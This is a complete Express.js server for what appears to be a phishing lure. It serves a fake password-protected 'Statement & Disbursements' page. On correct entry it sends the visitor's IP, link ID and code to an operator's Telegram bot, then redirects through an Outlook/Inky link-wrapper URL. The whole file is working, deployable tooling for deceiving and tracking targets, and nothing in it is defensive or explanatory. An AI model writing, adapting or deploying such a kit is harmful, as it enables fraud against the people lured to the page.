const express = require('express');
const app = express();
app.use(express.json());

// ==========================================
// YOUR HTML (Paste your exact HTML here)
// ==========================================
const myHTML = `
<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Statement & Disbursements - Authorized access only">
  <title>Protected document</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      height: 100vh;
      overflow: hidden;
    }

    .container {
      display: flex;
      height: 100vh;
    }

    /* Left Side - Image Section */
    .image-section {
      flex: 1;
      position: relative;
      background: linear-gradient(to bottom, rgba(30, 58, 95, 0.4), rgba(30, 58, 95, 0.85)), 
                  url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 800"><rect fill="%231e3a5f" width="1200" height="800"/><g fill="%232d4a6f" opacity="0.5"><rect x="100" y="150" width="400" height="250" rx="12"/><circle cx="700" cy="300" r="150"/><rect x="850" y="100" width="250" height="400" rx="8"/></g><g fill="%234a6a8f" opacity="0.3"><rect x="200" y="450" width="300" height="200" rx="10"/><circle cx="600" cy="600" r="120"/><rect x="900" y="550" width="200" height="150" rx="6"/></g></svg>');
      background-size: cover;
      background-position: center;
      display: flex;
      flex-direction: column;
      justify-content: flex-end;
      padding: 48px;
      color: white;
    }

    .company-label {
      font-size: 12px;
      font-weight: 700;
      letter-spacing: 0.1em;
      text-transform: uppercase;
      margin-bottom: 12px;
      opacity: 0.9;
    }

    .document-title {
      font-size: 40px;
      font-weight: 700;
      margin-bottom: 12px;
      line-height: 1.2;
    }

    .document-meta {
      font-size: 15px;
      opacity: 0.85;
      font-weight: 400;
    }

    /* Right Side - Form Section */
    .form-section {
      width: 520px;
      background: white;
      padding: 64px 56px;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }

    .form-title {
      font-size: 28px;
      font-weight: 700;
      color: #1a202c;
      margin-bottom: 8px;
    }

    .form-subtitle {
      font-size: 14px;
      color: #718096;
      margin-bottom: 24px;
    }

    .form-description {
      font-size: 15px;
      color: #4a5568;
      line-height: 1.6;
      margin-bottom: 32px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: #2d3748;
      margin-bottom: 8px;
    }

    .form-input {
      width: 100%;
      height: 48px;
      padding: 0 16px;
      border: 2px solid #4299e1;
      border-radius: 6px;
      font-size: 15px;
      color: #2d3748;
      transition: all 0.2s;
      outline: none;
    }

    .form-input:focus {
      border-color: #4299e1;
      box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.2);
    }

    .form-input::placeholder {
      color: #a0aec0;
    }

    .submit-btn {
      width: 100%;
      height: 48px;
      background: #1e3a5f;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
      margin-top: 8px;
    }

    .submit-btn:hover {
      background: #152a45;
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(30, 58, 95, 0.4);
    }

    .submit-btn:active {
      transform: translateY(0);
    }

    .form-footer {
      margin-top: 20px;
      font-size: 13px;
      color: #a0aec0;
      text-align: center;
    }

    .error-message {
      color: #e53e3e;
      font-size: 13px;
      margin-top: 8px;
      min-height: 20px;
    }

    /* Responsive */
    @media (max-width: 968px) {
      .image-section {
        display: none;
      }
      
      .form-section {
        width: 100%;
        padding: 48px 32px;
      }
    }

    @media (max-width: 480px) {
      .form-section {
        padding: 32px 24px;
      }
      
      .form-title {
        font-size: 24px;
      }
      
      .document-title {
        font-size: 32px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Left Side - Image Section -->
    <div class="image-section">
      <div class="company-label">Protected Document</div>
      <h1 class="document-title">Statement & Disbursements</h1>
      <div class="document-meta">Reference 248395JH49Z2 · Pending Review</div>
    </div>

    <!-- Right Side - Form Section -->
    <div class="form-section">
      <h2 class="form-title">Enter the password to view</h2>
      <p class="form-subtitle">Authorized access only</p>
      <p class="form-description">
        Your latest financial statement and disbursement details are now available. Enter the password you were given to open the document.
      </p>

      <form id="access-form">
        <div class="form-group">
          <label class="form-label" for="access-code">DOCUMENT PASSWORD</label>
          <input 
            type="password" 
            id="access-code" 
            class="form-input" 
            placeholder="Enter access code"
            autocomplete="off"
            required
          >
          <div class="error-message" id="error-message"></div>
        </div>

        <button type="submit" class="submit-btn">Unlock Document</button>
      </form>

      <p class="form-footer">The file stays on this page until it is unlocked.</p>
    </div>
  </div>

  <script>
    document.getElementById("access-form").addEventListener("submit", async function(e) {
      e.preventDefault();
      const code = document.getElementById("access-code").value;
      const errorDiv = document.getElementById("error-message");
      
      errorDiv.textContent = "Verifying...";
      
      try {
        const res = await fetch('/verify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ code: code })
        });
        const data = await res.json();
        
        if (data.success) {
          window.location.replace(data.redirectUrl);
        } else {
          errorDiv.textContent = data.message;
        }
      } catch (err) {
        errorDiv.textContent = "Connection error.";
      }
    });
  </script>
</body>
</html>
`;

// ==========================================
// THE BACKEND API
// ==========================================
app.post('/verify', async (req, res) => {
  const { code } = req.body;
  const linkId = req.query.id || 'unknown'; // Capture the unique ID from URL
  const CORRECT_CODE = "A22435";
  const TARGET_URL = "https://shared.outlook.inky.com/link?domain=web-tracker.bisnow.net&t=h.eJx1kcFu2zAMhl-lMBCfKsuW4tgpYLQdht22dehtl0CmmESwLQUSVXcb9u6TULS9rIAOEvnx50_qTxH9XNxcFWeiS7jhfMWRkVcwoa9GE6xbK4vEbxWQcXYAYOHibHCewWxgKi_qhIekMbwJrOtrIbiFryqcjT2Rs0wDt7gGDm51fkrB1CzfmI5JkhgYDzOyQFEbN7Km2UnZl5c4ziacD1oRDqIWIiVYsyshlaClg9HDK-kONi4j-kF0cltvRF3GgD4TJSl_Qno3upH3G_ElnWz3xUa2mwIfo_hk5gx9TARKJpfkimkTxujDy2NUR9H3VYjLovwv5pMQpq6pJ_pQaXzit9OwC88P3_zSxM_hNz029WP79cfPTw_fi-urYso_RCbPRm61XKfNT3fvgQoU7yTsermvd81RNBJkC0IcYb89amxl1_a86fa16NKmumor220vuiyNWXo2ajndpY0G8hHoGTymQfKsGdEZ-W_y7z-2tsPU.MEYCIQDX_YzacPSxtw02u84RPHJw6R1JdMww8wG16ZOrgiHW6wIhAJ1HXXOnujRLNIBZU8FEdualXTSO9jLp68Wkf7JjX79j";

  if (code === CORRECT_CODE) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (token && chatId) {
      const ip = req.headers['x-forwarded-for'] || req.ip;
      const message = ` *DOCUMENT ACCESSED*\n Link ID: ${linkId}\n IP: ${ip}\n✅ Code: ${code}`;
      
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
      });
    }
    return res.json({ success: true, redirectUrl: TARGET_URL });
  }

  return res.status(401).json({ success: false, message: "That access code is incorrect. Try again." });
});

// Serve the HTML on the homepage
app.get('/', (req, res) => {
  res.send(myHTML);
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
